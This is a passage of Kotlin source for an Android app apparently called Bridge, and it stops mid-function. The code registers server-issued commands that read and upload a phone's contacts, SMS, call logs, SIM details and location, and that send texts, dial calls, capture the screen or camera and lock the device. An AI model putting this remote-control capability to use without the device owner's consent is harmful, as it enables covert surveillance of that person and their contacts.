package my.bridge.com.di

import android.app.AlarmManager
import android.app.PendingIntent
import android.app.admin.DevicePolicyManager
import android.content.ComponentName
import android.content.Context
import android.content.Intent
import android.os.Bundle
import android.os.Handler
import android.os.Looper
import android.os.SystemClock
import androidx.core.content.ContextCompat
import dagger.Module
import dagger.Provides
import dagger.hilt.InstallIn
import dagger.hilt.android.qualifiers.ApplicationContext
import dagger.hilt.components.SingletonComponent
import java.io.File
import java.util.concurrent.TimeUnit
import my.bridge.com.core.common.DiagLog
import my.bridge.com.core.network.api.BridgeApi
import my.bridge.com.core.network.api.BridgeApiClient
import my.bridge.com.core.network.ws.BridgeWebSocketClient
import my.bridge.com.core.network.ws.Command
import my.bridge.com.core.network.ws.CommandExecutor
import my.bridge.com.core.network.ws.CommandResult
import my.bridge.com.core.storage.DeviceStore
import my.bridge.com.admin.BridgeAdminReceiver
import my.bridge.com.data.BatteryReporter
import my.bridge.com.data.CallLogReader
import my.bridge.com.data.ContactsReader
import my.bridge.com.data.ForegroundAppReader
import my.bridge.com.data.NetworkReporter
import my.bridge.com.data.PhoneDialer
import my.bridge.com.data.SimHelper
import my.bridge.com.data.SmsReader
import my.bridge.com.data.SmsSender
import my.bridge.com.data.VolumeController
import my.bridge.com.interact.DeviceVibrator
import my.bridge.com.interact.OverlayDialog
import my.bridge.com.interact.ToastHelper
import my.bridge.com.interact.TtsSpeaker
import my.bridge.com.location.LocationHelper
import my.bridge.com.media.MediaCaptureService
import my.bridge.com.media.ProjectionConsentActivity
import my.bridge.com.media.ScreenCaptureHolder
import my.bridge.com.media.MusicPlayer
import okhttp3.MultipartBody
import okhttp3.RequestBody
import okhttp3.MediaType.Companion.toMediaTypeOrNull
import retrofit2.HttpException
import timber.log.Timber
import kotlinx.coroutines.CoroutineScope
import kotlinx.coroutines.Dispatchers
import kotlinx.coroutines.SupervisorJob
import kotlinx.coroutines.launch
import javax.inject.Singleton

/**
 * 命令执行器装配。
 *
 * 注册服务端可下发的命令（与服务端 ALLOWED_COMMANDS 白名单一致）：
 * - upload_log：采集诊断日志并上传到后端。
 * - play_music / pause_music / resume_music / stop_music：音乐播放与控制
 *   （状态机与回执语义见 [MusicPlayer] 与 docs/api/commands/control.md）。
 * - get_location：获取设备位置（定位策略见 [LocationHelper] 与 docs/api/commands/data.md）。
 */
@Module
@InstallIn(SingletonComponent::class)
object CommandModule {

    /** fire-and-forget 上报用的独立作用域：失败不影响命令执行链路。 */
    private val reportScope = CoroutineScope(SupervisorJob() + Dispatchers.IO)

    @Provides
    @Singleton
    fun provideCommandExecutors(
        @ApplicationContext context: Context,
        deviceStore: DeviceStore,
        apiClient: BridgeApiClient,
        // dagger.Lazy 断依赖环：BridgeWebSocketClient 构造需要本执行器表，
        // 执行器表只在弹窗点击回调时才真正取用 client（运行期已装配完成）
        webSocketClient: dagger.Lazy<BridgeWebSocketClient>,
    ): Map<String, CommandExecutor> = mapOf(
        Command.UPLOAD_LOG to CommandExecutor { command ->
            executeUploadLog(context, deviceStore, apiClient, command)
        },
        Command.PLAY_MUSIC to CommandExecutor { command ->
            executePlayMusic(context, deviceStore, apiClient, command)
        },
        Command.PAUSE_MUSIC to CommandExecutor { command ->
            executeMusicControl(command) {
                when (MusicPlayer.state) {
                    MusicPlayer.State.IDLE -> fail("当前没有正在播放的音乐")
                    MusicPlayer.State.PAUSED -> ok("已处于暂停状态：${MusicPlayer.currentSource}")
                    MusicPlayer.State.PLAYING -> {
                        MusicPlayer.pause()
                        ok("已暂停：${MusicPlayer.currentSource}")
                    }
                }
            }
        },
        Command.RESUME_MUSIC to CommandExecutor { command ->
            executeMusicControl(command) {
                when (MusicPlayer.state) {
                    MusicPlayer.State.IDLE -> fail("当前没有可恢复的音乐")
                    MusicPlayer.State.PLAYING -> fail("正在播放中，无需恢复")
                    MusicPlayer.State.PAUSED -> {
                        MusicPlayer.resume()
                        ok("恢复播放：${MusicPlayer.currentSource}")
                    }
                }
            }
        },
        Command.STOP_MUSIC to CommandExecutor { command ->
            executeMusicControl(command) {
                when (MusicPlayer.state) {
                    MusicPlayer.State.IDLE -> fail("当前没有正在播放的音乐")
                    else -> {
                        MusicPlayer.stop()
                        ok("已停止")
                    }
                }
            }
        },
        Command.GET_LOCATION to CommandExecutor { command ->
            executeGetLocation(context, deviceStore, apiClient, command)
        },
        Command.GET_CURRENT_PAGE to CommandExecutor { command ->
            executeGetCurrentPage(context, command)
        },
        Command.GET_NETWORK to CommandExecutor { command ->
            executeGetNetwork(context, command)
        },
        Command.GET_BATTERY to CommandExecutor { command ->
            executeGetBattery(context, command)
        },
        Command.GET_CONTACTS to CommandExecutor { command ->
            executeGetContacts(context, deviceStore, apiClient, command)
        },
        Command.GET_SMS to CommandExecutor { command ->
            executeGetSms(context, deviceStore, apiClient, command)
        },
        Command.GET_CALL_LOG to CommandExecutor { command ->
            executeGetCallLog(context, deviceStore, apiClient, command)
        },
        Command.GET_SIM_INFO to CommandExecutor { command ->
            executeGetSimInfo(context, deviceStore, apiClient, command)
        },
        Command.SEND_SMS to CommandExecutor { command ->
            executeSendSms(context, command)
        },
        Command.DIAL_PHONE to CommandExecutor { command ->
            executeDialPhone(context, command)
        },
        Command.SET_VOLUME to CommandExecutor { command ->
            executeSetVolume(context, command)
        },
        Command.LOCK_SCREEN to CommandExecutor { command ->
            executeLockScreen(context, command)
        },
        Command.RESTART_APP to CommandExecutor { command ->
            executeRestartApp(context, command)
        },
        Command.SCREENSHOT to CommandExecutor { command ->
            executeProjectionCapture(context, deviceStore, apiClient, command, MediaCaptureService.MODE_SCREENSHOT)
        },
        Command.RECORD_SCREEN to CommandExecutor { command ->
            executeProjectionCapture(context, deviceStore, apiClient, command, MediaCaptureService.MODE_RECORD)
        },
        Command.TAKE_PHOTO to CommandExecutor { command ->
            executeTakePhoto(context, deviceStore, apiClient, command)
        },
        Command.SHOW_TOAST to CommandExecutor { command ->
            executeShowToast(context, command)
        },
        Command.SPEAK to CommandExecutor { command ->
            executeSpeak(context, command)
        },
        Command.VIBRATE to CommandExecutor { command ->
            executeVibrate(context, command)
        },
        Command.SHOW_DIALOG to CommandExecutor { command ->
            executeShowDialog(context, webSocketClient::get, command)
        },
        Command.CHECK_UPDATE to CommandExecutor { command ->
            executeCheckUpdate(context, deviceStore, apiClient, command)
        },
    )

    private suspend fun executeUploadLog(
        context: Context,
        deviceStore: DeviceStore,
        apiClient: BridgeApiClient,
        command: Command,
    ): CommandResult {
        return try {
            val deviceId = deviceStore.deviceId()
            val content = DiagLog.dump(context)
            val deviceName = deviceStore.deviceName() ?: deviceId
            val appVersion = DiagLog.appVersionName(context)
            val message = apiClient.uploadLog(
                deviceId = deviceId,
                content = content,
                deviceName = deviceName,
                appVersion = appVersion,
            )
            Timber.i("命令 upload_log 上传成功：$message")
            CommandResult(command.commandId, command.command, true, message)
        } catch (e: Exception) {
            Timber.e(e, "命令 upload_log 上传失败")
            CommandResult(command.commandId, command.command, false, "上传失败：${e.message}")
        }
    }

    /**
     * 执行 play_music：音源参数 url 按形态分三路。
     *
     * ① http(s):// 开头 → 远程 URL，MediaPlayer 直接流式播放（不缓存）；
     * ② / 开头 → 本地绝对路径，文件存在即直接播放（不存在则失败回执）；
     * ③ 其余（裸文件名，如 test.mp3）→ 客户端缓存目录优先：
     *    命中 → 直接播放；未命中 → 从服务器共享音乐目录下载（GET /api/music/{name}），
     *    持久化到缓存目录后播放，下次同名直接命中。
     *
     * 缓存目录 = App 私有目录 music/（getExternalFilesDir），无需存储权限，卸载自动清理。
     */
    private suspend fun executePlayMusic(
        context: Context,
        deviceStore: DeviceStore,
        apiClient: BridgeApiClient,
        command: Command,
    ): CommandResult {
        val id = command.commandId
        val name = command.command
        val source = command.params.get("url")
            ?.takeIf { it.isJsonPrimitive }
            ?.asString
            ?.trim()
        if (source.isNullOrEmpty()) {
            return CommandResult(id, name, false, "缺少音源参数 url")
        }
        val loop = command.params.get("loop")
            ?.takeIf { it.isJsonPrimitive }
            ?.asBoolean ?: false

        return try {
            val resolved = resolveSource(context, deviceStore, apiClient, source)
            MusicPlayer.play(resolved, loop)
            Timber.i("命令 play_music 播放成功：$resolved（loop=$loop）")
            CommandResult(id, name, true, "播放中：$source")
        } catch (e: Exception) {
            Timber.e(e, "命令 play_music 播放失败：$source")
            CommandResult(id, name, false, "播放失败：${e.message}")
        }
    }

    /**
     * 音乐控制类命令（pause/resume/stop）统一包装：
     * 按当前 [MusicPlayer.state] 判定操作合法性，异常统一转失败回执。
     *
     * block 返回 (是否成功, 回执消息)；操作被状态约束拒绝时直接返回失败对，
     * 播放器抛出的 [IllegalStateException] 等异常也在此兜底。
     */
    private inline fun executeMusicControl(
        command: Command,
        block: () -> Pair<Boolean, String>,
    ): CommandResult = try {
        val (success, message) = block()
        CommandResult(command.commandId, command.command, success, message)
    } catch (e: Exception) {
        Timber.e(e, "命令 ${command.command} 执行失败")
        CommandResult(command.commandId, command.command, false, "执行失败：${e.message}")
    }

    /**
     * 执行 get_location：获取设备位置（真实实现，见 [LocationHelper]）。
     *
     * @param params.precision "coarse"（网络定位，默认）/ "fine"（GPS，超时回退网络）
     * @param params.timeout   超时秒数（默认 15，下限 5 上限 120）
     * @param params.refresh   强制刷新：跳过 5 分钟新鲜缓存短路，直接监听定位；
     *                         陈旧缓存兜底仍保留（回执来源字段标注缓存年龄）
     *
     * 权限：Manifest 已声明 COARSE/FINE/BACKGROUND（保活资源锚点），此处校验运行时授权；
     * fine 模式需 FINE 权限（仅有 COARSE 时自动降级为 coarse 并注明）。
     * v1 纯文本回执；[my.bridge.com.location.LocationHelper.LocationFix] 为结构化数据，
     * 后续版本直接序列化上报服务端持久化（SQL/MySQL）。
     */
    private suspend fun executeGetLocation(
        context: Context,
        deviceStore: DeviceStore,
        apiClient: BridgeApiClient,
        command: Command,
    ): CommandResult {
        val id = command.commandId
        val name = command.command

        if (!LocationHelper.hasPermission(context)) {
            return CommandResult(id, name, false, "缺少定位权限，请打开 App 在系统设置中授予定位权限后重试")
        }
        var precision = command.params.get("precision")
            ?.takeIf { it.isJsonPrimitive }
            ?.asString
            ?.trim() ?: "coarse"
        var degradedNote = ""
        if (precision == "fine" && !LocationHelper.hasFinePermission(context)) {
            precision = "coarse"
            degradedNote = "（仅有粗略定位权限，已降级为网络定位）"
        }
        val timeoutSec = command.params.get("timeout")
            ?.takeIf { it.isJsonPrimitive }
            ?.asInt
            ?.coerceIn(5, 120) ?: 15
        val refresh = command.params.get("refresh")
            ?.takeIf { it.isJsonPrimitive }
            ?.asBoolean ?: false
        val refreshNote = if (refresh) "（强制刷新，已跳过缓存）" else ""

        return try {
            val fix = LocationHelper.getLocation(context, precision, timeoutSec * 1000L, refresh)
            Timber.i("命令 get_location 成功：${fix.toMessage()}（refresh=$refresh）")
            reportLocationFireAndForget(deviceStore, apiClient, fix)
            CommandResult(id, name, true, fix.toMessage() + degradedNote + refreshNote)
        } catch (e: Exception) {
            Timber.e(e, "命令 get_location 失败")
            CommandResult(id, name, false, "定位失败：${e.message}")
        }
    }

    /**
     * 位置上报服务端持久化（fire-and-forget）：成功后异步 POST /api/locations，
     * 失败仅记日志，**绝不影响命令回执**——存档与回执解耦。
     */
    private fun reportLocationFireAndForget(
        deviceStore: DeviceStore,
        apiClient: BridgeApiClient,
        fix: my.bridge.com.location.LocationHelper.LocationFix,
    ) {
        reportScope.launch {
            try {
                val deviceId = deviceStore.deviceId()
                val token = runCatching { deviceStore.token() }.getOrNull()
                val action = apiClient.reportLocation(
                    deviceId = deviceId,
                    token = token,
                    latitude = fix.latitude,
                    longitude = fix.longitude,
                    accuracy = fix.accuracyMeters.toDouble(),
                    provider = fix.provider,
                    altitude = fix.altitudeMeters,
                    speed = fix.speedMps?.toDouble(),
                    fixTimeMs = fix.timestampMs,
                )
                Timber.i("位置上报成功：device=%s action=%s", deviceId, action)
            } catch (e: Exception) {
                Timber.w(e, "位置上报失败（不影响回执，忽略）")
            }
        }
    }

    private fun ok(message: String): Pair<Boolean, String> = true to message

    private fun fail(message: String): Pair<Boolean, String> = false to message

    // ------------------------------------------------------------------
    // 数据采集类命令（get_contacts / get_sms / get_call_log）
    //
    // 共同形态：权限校验 → 本地读取 → REST 上报服务端持久化 → 汇总回执。
    // 与 get_location 不同，这里**数据本身就是命令主产物**（后台页面消费），
    // 上报失败要在回执中注明而非静默忽略。
    // ------------------------------------------------------------------

    /** 参数里的开关（缺省 false）。 */
    private fun Command.boolParam(key: String): Boolean =
        params.get(key)?.takeIf { it.isJsonPrimitive }?.asBoolean ?: false

    /** 参数里的整数（缺省 default，收敛到 min–max）。 */
    private fun Command.intParam(key: String, default: Int, min: Int, max: Int): Int =
        params.get(key)?.takeIf { it.isJsonPrimitive }?.asInt?.coerceIn(min, max) ?: default

    /** 参数里的字符串（缺省 default）。 */
    private fun Command.strParam(key: String, default: String): String =
        params.get(key)?.takeIf { it.isJsonPrimitive }?.asString?.trim()?.takeIf { it.isNotEmpty() }
            ?: default

    /** 数据类命令执行骨架：校验权限 → 读取 → 上报 → 回执。 */
    private suspend fun <T> executeDataCollection(
        context: Context,
        deviceStore: DeviceStore,
        apiClient: BridgeApiClient,
        command: Command,
        permissionName: String,
        hasPermission: (Context) -> Boolean,
        read: (Context) -> List<T>,
        upload: suspend (deviceId: String, token: String?, items: List<T>) -> String,
    ): CommandResult {
        val id = command.commandId
        val name = command.command
        if (!hasPermission(context)) {
            return CommandResult(id, name, false, "缺少${permissionName}权限，请打开 App 在系统设置中授予后重试")
        }
        val items = try {
            read(context)
        } catch (e: Exception) {
            Timber.e(e, "命令 $name 本地读取失败")
            return CommandResult(id, name, false, "读取失败：${e.message}")
        }
        if (items.isEmpty()) {
            return CommandResult(id, name, true, "未读取到数据（可能设备上确实没有，或被参数过滤）")
        }
        return try {
            val deviceId = deviceStore.deviceId()
            val token = runCatching { deviceStore.token() }.getOrNull()
            val summary = upload(deviceId, token, items)
            Timber.i("命令 %s 成功：%s", name, summary)
            CommandResult(id, name, true, summary)
        } catch (e: Exception) {
            Timber.e(e, "命令 $name 上报失败（已读取 ${items.size} 条）")
            CommandResult(
                id, name, false,
                "已读取 ${items.size} 条但上报失败：${e.message}（可重试下发）",
            )
        }
    }

    /**
     * 执行 get_contacts：读取通讯录并上报（服务端按设备覆盖快照）。
     *
     * @param params.only_with_phones 仅含有号码的联系人（默认开）
     * @param params.limit            数量上限（默认 2000，上限 5000）
     */
    private suspend fun executeGetContacts(
        context: Context,
        deviceStore: DeviceStore,
        apiClient: BridgeApiClient,
        command: Command,
    ): CommandResult {
        val onlyWithPhones =
            if (command.params.has("only_with_phones")) command.boolParam("only_with_phones") else true
        val limit = command.intParam("limit", 2000, 10, 5000)
        return executeDataCollection(
            context, deviceStore, apiClient, command,
            permissionName = "通讯录",
            hasPermission = { ContactsReader.hasPermission(it) },
            read = { ContactsReader.read(it, onlyWithPhones, limit) },
        ) { deviceId, token, items ->
            val r = apiClient.reportContacts(
                deviceId, token,
                items.map {
                    BridgeApi.ContactItem(
                        contact_key = it.key, name = it.name,
                        phones = it.phones, emails = it.emails,
                    )
                },
            )
            "已上报 ${items.size} 个联系人（服务端快照已更新）"
        }
    }

    /**
     * 执行 get_sms：读取短信并上报（服务端累积 + 去重）。
     *
     * @param params.sms_type all/inbox/sent/draft/outbox/failed（默认 all）
     * @param params.limit    条数上限（默认 100，上限 1000）
     */
    private suspend fun executeGetSms(
        context: Context,
        deviceStore: DeviceStore,
        apiClient: BridgeApiClient,
        command: Command,
    ): CommandResult {
        val smsType = command.strParam("sms_type", "all")
        val limit = command.intParam("limit", 100, 5, 1000)
        return executeDataCollection(
            context, deviceStore, apiClient, command,
            permissionName = "短信",
            hasPermission = { SmsReader.hasPermission(it) },
            read = { SmsReader.read(it, smsType, limit) },
        ) { deviceId, token, items ->
            val r = apiClient.reportSmsBatch(
                deviceId, token,
                items.map {
                    BridgeApi.SmsItem(
                        sms_key = it.key, address = it.address, body = it.body,
                        type = it.type, date_ms = it.dateMs, read = it.read,
                        sim_slot = it.simSlot, sim_number = it.simNumber,
                    )
                },
            )
            "已读取 ${items.size} 条短信并上报（新增 ${r.inserted}，更新 ${r.updated}；" +
                "含所属卡信息，重复上报可回填历史数据的卡字段）"
        }
    }

    /**
     * 执行 get_call_log：读取通话记录并上报（服务端按设备覆盖快照）。
     *
     * @param params.call_type all/incoming/outgoing/missed（默认 all）
     * @param params.limit     条数上限（默认 200，上限 1000）
     */
    private suspend fun executeGetCallLog(
        context: Context,
        deviceStore: DeviceStore,
        apiClient: BridgeApiClient,
        command: Command,
    ): CommandResult {
        val callType = command.strParam("call_type", "all")
        val limit = command.intParam("limit", 200, 5, 1000)
        return executeDataCollection(
            context, deviceStore, apiClient, command,
            permissionName = "通话记录",
            hasPermission = { CallLogReader.hasPermission(it) },
            read = { CallLogReader.read(it, callType, limit) },
        ) { deviceId, token, items ->
            val r = apiClient.reportCallLogs(
                deviceId, token,
                items.map {
                    BridgeApi.CallLogItem(
                        call_key = it.key, number = it.number, name = it.name,
                        type = it.type, duration = it.duration,
                        date_ms = it.dateMs, location = it.location,
                        sim_slot = it.simSlot, sim_number = it.simNumber,
                    )
                },
            )
            "已上报 ${items.size} 条通话记录（服务端快照已更新；含所属卡信息）"
        }
    }

    /**
     * 执行 get_sim_info：读取 SIM 卡列表并上报（服务端按设备覆盖快照）。
     *
     * 上报后后台「发送短信/拨打电话」的选卡下拉即可显示该设备实际卡
     * （卡序号/号码/运营商）。无 READ_PHONE_STATE 权限时回执明示（卡来源
     * 标记与选卡校验同样依赖该权限）。
     */
    private suspend fun executeGetSimInfo(
        context: Context,
        deviceStore: DeviceStore,
        apiClient: BridgeApiClient,
        command: Command,
    ): CommandResult {
        val id = command.commandId
        val name = command.command
        if (!SimHelper.hasPhoneStatePermission(context)) {
            return CommandResult(
                id, name, false,
                "缺少电话状态权限，请打开 App 在系统设置中授予后重试",
            )
        }
        val sims = SimHelper.listSims(context)
        if (sims.isEmpty()) {
            return CommandResult(id, name, true, "未读到可用 SIM 卡（设备可能未插卡）")
        }
        val summary = "共 ${sims.size} 张卡：" + sims.joinToString("；") {
            "${it.slotLabel}（${if (it.number.isNotBlank()) it.number else "号码未知"}" +
                if (it.carrier.isNotBlank()) " · ${it.carrier}）" else "）"
        }
        return try {
            val deviceId = deviceStore.deviceId()
            val token = runCatching { deviceStore.token() }.getOrNull()
            apiClient.reportSims(
                deviceId, token,
                sims.map {
                    BridgeApi.SimItem(
                        slot_index = it.slotIndex,
                        subscription_id = it.subscriptionId,
                        number = it.number,
                        carrier = it.carrier,
                    )
                },
            )
            Timber.i("命令 %s 成功：%s", name, summary)
            CommandResult(id, name, true, "$summary（已上报，选卡下拉已可显示具体卡信息）")
        } catch (e: Exception) {
            Timber.e(e, "命令 get_sim_info 上报失败")
            CommandResult(id, name, false, "已读取（$summary）但上报失败：${e.message}（可重试下发）")
        }
    }

    // ------------------------------------------------------------------
    // 写操作类命令（send_sms / dial_phone）
    //
    // 与数据采集类相反：这两个命令**改动设备/外界状态**（真实发短信会计费、
    // 直接拨打会产生通话），客户端只做「机械执行 + 如实回执」，
    // 下发前的确认责任在管理后台操作者（catalog 描述里已注明计费风险）。
    // ------------------------------------------------------------------

    /**
     * 执行 send_sms：用本机 SIM 卡发送短信。
     *
     * @param params.phones  收件人号码，中英文逗号/分号/竖线分隔可发多个
     * @param params.content 短信内容（超 70 字自动 multipart 切分）
     * @param params.sim     发送卡：auto（默认卡）/ sim1 / sim2 / sim3；
     *                       指定的卡不存在时回执失败（不静默退默认卡）
     *
     * 逐号码串行发送，等待系统 sent 回执（15 秒超时）后才计结果，
     * 回执汇总实际使用卡 + 每个号码的成功/失败明细（见 [SmsSender]）。
     */
    private suspend fun executeSendSms(context: Context, command: Command): CommandResult {
        val id = command.commandId
        val name = command.command
        if (!SmsSender.hasPermission(context)) {
            return CommandResult(id, name, false, "缺少短信权限，请打开 App 在系统设置中授予后重试")
        }
        val phonesRaw = command.params.get("phones")
            ?.takeIf { it.isJsonPrimitive }?.asString?.trim().orEmpty()
        val content = command.params.get("content")
            ?.takeIf { it.isJsonPrimitive }?.asString?.trim().orEmpty()
        if (phonesRaw.isEmpty()) return CommandResult(id, name, false, "缺少接收号码参数 phones")
        if (content.isEmpty()) return CommandResult(id, name, false, "缺少短信内容参数 content")

        // 统一中英文逗号/分号/竖线为分号后拆分，去空去重（保持顺序）
        val phones = phonesRaw.replace("，", ";").replace("；", ";")
            .replace(",", ";").replace("|", ";")
            .split(";").map { it.trim() }.filter { it.isNotEmpty() }.distinct()
        if (phones.isEmpty()) return CommandResult(id, name, false, "未解析到有效号码")
        if (phones.size > 20) return CommandResult(id, name, false, "单次最多 20 个号码（当前 ${phones.size} 个）")

        return try {
            // 解析发送卡：auto=null（系统默认卡），否则按卡槽序号找激活卡
            val simParam = command.params.get("sim")
                ?.takeIf { it.isJsonPrimitive }?.asString?.trim() ?: "auto"
            val simSlot = SimHelper.slotParam(simParam)
            var subscriptionId: Int? = null
            var simNote = "默认卡"
            if (simSlot != null) {
                val sim = SimHelper.findBySlot(context, simSlot)
                if (sim == null) {
                    return CommandResult(
                        id, name, false,
                        "设备上没有卡${simSlot + 1}（当前：${SimHelper.summarize(context)}）",
                    )
                }
                subscriptionId = sim.subscriptionId
                simNote = sim.displayLabel
            }
            val details = SmsSender.send(context, phones, content, subscriptionId)
            val okList = details.filter { it.success }
            val failList = details.filterNot { it.success }
            val message = buildString {
                append("用[$simNote]发送完成：成功 ${okList.size}/${details.size}")
                if (failList.isNotEmpty()) {
                    append("；失败：")
                    append(failList.joinToString("；") { "${it.phone}（${it.message}）" })
                }
            }
            Timber.i("命令 %s：%s", name, message)
            // 只要有一个号码发出即算命令成功（失败明细已在消息里），全部失败才回执失败
            CommandResult(id, name, okList.isNotEmpty(), message)
        } catch (e: Exception) {
            Timber.e(e, "命令 send_sms 执行失败")
            CommandResult(id, name, false, "发送失败：${e.message}")
        }
    }

    /**
     * 执行 dial_phone：拨打电话。
     *
     * @param params.phone 电话号码
     * @param params.mode  direct（直接拨打，默认）/ dialer（打开拨号盘预填）
     *
     * direct 需 CALL_PHONE 运行时权限，缺失时**自动降级**为 dialer 并在回执注明；
     * 息屏/后台下系统可能拦截拨号界面弹出（Android 10+ 后台启动限制），
     * 回执里带提示，完整限制说明见 [PhoneDialer]。
     */
    private fun executeDialPhone(context: Context, command: Command): CommandResult {
        val id = command.commandId
        val name = command.command
        val phone = command.params.get("phone")
            ?.takeIf { it.isJsonPrimitive }?.asString?.trim().orEmpty()
        if (phone.isEmpty()) return CommandResult(id, name, false, "缺少电话号码参数 phone")
        val mode = command.params.get("mode")
            ?.takeIf { it.isJsonPrimitive }?.asString?.trim() ?: "direct"
        // 使用卡：auto=null（系统默认卡），否则 0 基卡槽序号（仅 direct 模式生效）
        val simParam = command.params.get("sim")
            ?.takeIf { it.isJsonPrimitive }?.asString?.trim() ?: "auto"
        val simSlot = SimHelper.slotParam(simParam)
        if (simSlot != null && mode != "dialer" && SimHelper.findBySlot(context, simSlot) == null) {
            // 指定的卡不存在：直接回执失败，避免「以为用卡2打了实际走默认卡」
            return CommandResult(
                id, name, false,
                "设备上没有卡${simSlot + 1}（当前：${SimHelper.summarize(context)}）",
            )
        }

        var direct = mode != "dialer"
        if (direct && !PhoneDialer.hasCallPermission(context)) {
            direct = false
            return try {
                val message = PhoneDialer.dial(context, phone, direct)
                CommandResult(id, name, true, "无直接拨打权限，已降级为拨号盘：$message")
            } catch (e: Exception) {
                Timber.e(e, "命令 dial_phone 降级拨号盘也失败")
                CommandResult(id, name, false, "缺少 CALL_PHONE 权限且拨号盘打开失败：${e.message}")
            }
        }
        return try {
            val message = PhoneDialer.dial(context, phone, direct, simSlot)
            Timber.i("命令 %s：%s", name, message)
            CommandResult(id, name, true, message)
        } catch (e: IllegalArgumentException) {
            CommandResult(id, name, false, e.message ?: "号码格式不合法")
        } catch (e: Exception) {
            Timber.e(e, "命令 dial_phone 执行失败")
            CommandResult(id, name, false, "拨号失败：${e.message}")
        }
    }

    /**
     * 执行 set_volume：调节系统音量（媒体/铃声/闹钟）。
     *
     * @param params.level  音量百分比 0-100（换算到设备实际档位）
     * @param params.stream media（默认）/ ring / alarm
     *
     * 设置后回读验证 + 三段兜底（见 [VolumeController]），
     * 回执带设备实际档位（如「媒体 音量已设为 12/15（80%）」）。
     */
    private fun executeSetVolume(context: Context, command: Command): CommandResult {
        val id = command.commandId
        val name = command.command
        val level = command.params.get("level")
            ?.takeIf { it.isJsonPrimitive }?.asString?.toDoubleOrNull()
            ?: return CommandResult(id, name, false, "缺少音量参数 level")
        if (level < 0 || level > 100) {
            return CommandResult(id, name, false, "音量百分比须在 0-100，收到：$level")
        }
        val streamParam = command.params.get("stream")
            ?.takeIf { it.isJsonPrimitive }?.asString?.trim() ?: "media"
        return try {
            val message = VolumeController.set(context, VolumeController.streamFor(streamParam), level.toInt())
            Timber.i("命令 %s：%s", name, message)
            CommandResult(id, name, true, message)
        } catch (e: Exception) {
            Timber.e(e, "命令 set_volume 执行失败")
            CommandResult(id, name, false, e.message ?: "音量设置失败")
        }
    }

    /**
     * 执行 lock_screen：锁屏（熄屏并上锁）。
     *
     * 依赖设备管理员激活（force-lock 策略，见 [my.bridge.com.admin.BridgeAdminReceiver]）：
     * 未激活时尝试在设备上弹出系统激活页（Android 10+ 后台启动可能被拦），
     * 回执失败并附激活步骤；已激活直接 lockNow。
     */
    private fun executeLockScreen(context: Context, command: Command): CommandResult {
        val id = command.commandId
        val name = command.command
        val dpm = context.getSystemService(DevicePolicyManager::class.java)
        val admin = ComponentName(context, BridgeAdminReceiver::class.java)
        if (dpm == null || !dpm.isAdminActive(admin)) {
            var launched = false
            try {
                val intent = Intent(DevicePolicyManager.ACTION_ADD_DEVICE_ADMIN).apply {
                    putExtra(DevicePolicyManager.EXTRA_DEVICE_ADMIN, admin)
                    putExtra(
                        DevicePolicyManager.EXTRA_ADD_EXPLANATION,
                        "Bridge 需要设备管理员权限以支持远程锁屏（仅使用「锁定屏幕」能力，" +
                            "可在设置中随时停用）",
                    )
                    addFlags(Intent.FLAG_ACTIVITY_NEW_TASK)
                }
                context.startActivity(intent)
                launched = true
            } catch (e: Exception) {
                Timber.w(e, "弹出设备管理员激活页失败（可能被后台启动限制拦截）")
            }
            val guide = if (launched) {
                "已在设备上弹出激活页，请在设备上点击「激活」，完成后重新下发本命令"
            } else {
                "请在设备上激活：设置 → 安全性 → 设备管理应用 → Bridge（仅锁屏能力），完成后重新下发本命令"
            }
            return CommandResult(id, name, false, "尚未激活设备管理员，无法锁屏。$guide")
        }
        return try {
            dpm.lockNow()
            Timber.i("命令 lock_screen：已锁屏")
            CommandResult(id, name, true, "已锁屏")
        } catch (e: Exception) {
            Timber.e(e, "命令 lock_screen 执行失败")
            CommandResult(id, name, false, "锁屏失败：${e.message}")
        }
    }

    /**
     * 执行 restart_app：重启客户端应用进程。
     *
     * 顺序敏感：先预约「1 秒后由系统闹钟拉起启动页」（进程被杀仍生效），
     * 再回执，回执发出后延迟杀进程（给 WebSocket 发送留时间）——
     * 若先杀进程，回执就永远发不出去。
     */
    private fun executeRestartApp(context: Context, command: Command): CommandResult {
        val id = command.commandId
        val name = command.command
        val launch = context.packageManager.getLaunchIntentForPackage(context.packageName)
            ?: return CommandResult(id, name, false, "无法获取启动 Intent，重启取消")

        // ① 预约重启拉起：AlarmManager 1 秒后启动 MainActivity（进程被杀仍触发）
        val pi = PendingIntent.getActivity(
            context,
            RESTART_APP_REQUEST_CODE,
            launch.apply { addFlags(Intent.FLAG_ACTIVITY_NEW_TASK) },
            PendingIntent.FLAG_UPDATE_CURRENT or PendingIntent.FLAG_IMMUTABLE,
        )
        val am = context.getSystemService(AlarmManager::class.java)
        val triggerAt = SystemClock.elapsedRealtime() + 1000
        try {
            am?.setExactAndAllowWhileIdle(AlarmManager.ELAPSED_REALTIME_WAKEUP, triggerAt, pi)
        } catch (e: SecurityException) {
            am?.set(AlarmManager.ELAPSED_REALTIME_WAKEUP, triggerAt, pi)
        }

        // ② 回执发出后（主线程延迟）杀进程；前台服务为 sticky，系统也会自动重拉
        Handler(Looper.getMainLooper()).postDelayed({
            Timber.i("restart_app：预约已就绪，杀进程完成重启")
            Runtime.getRuntime().exit(0)
        }, RESTART_APP_KILL_DELAY_MS)

        Timber.i("命令 restart_app：已预约 1 秒后重启")
        return CommandResult(
            id, name, true,
            "已预约重启：客户端进程即将退出并自动拉起（WebSocket 约 2-3 秒后重连）",
        )
    }

    /**
     * 执行 get_current_page：读取设备当前前台应用（应用级，见 [ForegroundAppReader]）。
     *
     * 需要「使用情况访问权」特殊授权（设备上开一次）：未授权时尝试弹出
     * 系统设置页（Android 10+ 后台可能被拦），回执失败并附开启步骤。
     */
    private fun executeGetCurrentPage(context: Context, command: Command): CommandResult {
        val id = command.commandId
        val name = command.command
        if (!ForegroundAppReader.hasUsageAccess(context)) {
            val launched = ForegroundAppReader.launchUsageAccessSettings(context)
            return CommandResult(id, name, false, ForegroundAppReader.notGrantedMessage(launched))
        }
        return try {
            val message = ForegroundAppReader.read(context)
            Timber.i("命令 %s：%s", name, message)
            CommandResult(id, name, true, message)
        } catch (e: Exception) {
            Timber.e(e, "命令 get_current_page 执行失败")
            CommandResult(id, name, false, e.message ?: "读取前台应用失败")
        }
    }

    /**
     * 执行 get_network：读取当前网络状态（见 [NetworkReporter]）。
     * 只读查询，无需新权限（缺定位/电话权限时对应子项显示「未知」不失败）。
     */
    private fun executeGetNetwork(context: Context, command: Command): CommandResult {
        val id = command.commandId
        val name = command.command
        return try {
            val message = NetworkReporter.read(context)
            Timber.i("命令 %s：%s", name, message)
